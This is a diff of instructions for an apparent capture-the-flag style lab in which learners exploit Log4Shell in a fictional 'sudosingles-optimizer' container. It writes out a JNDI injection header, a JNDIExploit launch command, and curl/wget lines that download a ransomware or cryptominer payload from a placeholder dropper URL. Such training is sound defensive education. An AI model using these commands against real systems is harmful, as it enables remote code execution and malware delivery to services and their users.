@@ -1,19 +1,27 @@
-The malicious command you want to execute is:
+== WHAT DO YOU NEED TO DO? ==
+To complete this challenge, you must use a "Basic Command" exploit from JNDIExploit to execute the following command INSIDE THE SUDOSINGLES-OPTIMIZER container:
 
-curl PAYLOADDROPPERURL --output /srv/connectioncheck
+wget PAYLOADDROPPERURL -O /srv/connectioncheck
 
-Where PAYLOADDROPPERURL is the value found in FSSPayloadDropperUrl in the credential field below.
+(where PAYLOADDROPPERURL is the value found in FSSPayloadDropperUrl in the credential field below)
 
-FSSPayloadDropperUrl is a special URL that can be used to drop a ransomware payload. When the above command executes in the container running sudosingles-optimizer, it will drop a nasty file in the /srv directory, disguised as something benign.
+== WHAT DOES THIS DO? ==
+FSSPayloadDropperUrl is a special URL that can be used to drop a cryptominer onto the host. If you manage to execute that "wget <…>" command inside the sudosingles-optimizer container, you will download a malicious payload from the internet and drop it in the container's file system.
 
-Just like before, you’ll make a request to your malicious LDAP server using curl on the attack machine. Open another Terminal Emulator window and run the following command:
+== WHY DO YOU WANT TO DO THIS? ==
+All images that appear on the SudoSingles™ website have to pass through the sudosingles-optimizer container for processing. Therefore, if a malicious file is present in the sudosingles-optimizer container, it will be served to ALL USERS of SudoSingles™. That's some good pwnage.
 
-curl http://sudosingles-optimizer -H 'X-Api-Version: ${jndi:ldap://YOURIP:1389/Basic/Command/Base64/PAYLOAD}'
+== HOW ARE YOU GOING TO DO THIS? ==
+Great question, champ. That's what this challenge is all about. Here's my guidance:
 
-Where PAYLOAD is the malicious command that we crafted above and YOURIP is the attack machine’s private IP.
+1.  Open a new Terminal Emulator window inside the hacker directory and execute the following: "java -jar JNDIExploit-1.2-SNAPSHOT.jar -i $(hostname -I) --usage"
+2.  This should tell you how to "use" the exploits contained in JNDIExploit. What do you see? Scroll around the output and take note of the options, especially those at the top of the list.
+3.  You already know that you can execute the JNDIExploit's "Basic SpringEcho" exploit using: curl http://sudosingles-optimizer -H 'X-Api-Version: ${jndi:ldap://YOURIP:1389/Basic/SpringEcho}'
+4.  This time, your task is to use one of the "Basic Command" exploits from JNDIExploit to execute the "wget <…>" command inside the sudosingles-optimizer container.
+5.  Look at the output of #2. Can you find any information there to help you accomplish #4?
+6.  If you're trying to execute the "wget <…>" command on the attack machine, you're barking up the wrong tree. Remember, you need to use an exploit from JNDIExploit to execute it on the sudosingles-optimizer container.
+7.  My last piece of advice, and the only free hint I'll give you, is that you'll need to somehow encode the "wget <…>" command in order to execute it using one of the "Basic Command" exploits.
 
-However, you’ll notice that if you just try to substitute the malicious command for PAYLOAD, then run the whole request to sudosingles-optimizer above, the exploit won’t work. Something is missing…
-
-Maybe you need to encode PAYLOAD somehow? Hm…
+Good luck -- this one can be challenging. Be sure to read carefully and make sure you understand each step. Also, don't be afraid to take the hints. I've written a lot for you, so take advantage of them before bugging Support. Also, remember that you're trying to execute one of the most famous exploits in the last few years. I'm sure there are a few blog posts out there about how it works.
 
 When you believe you’ve successfully performed the exploit, click “Verify” to check your work.
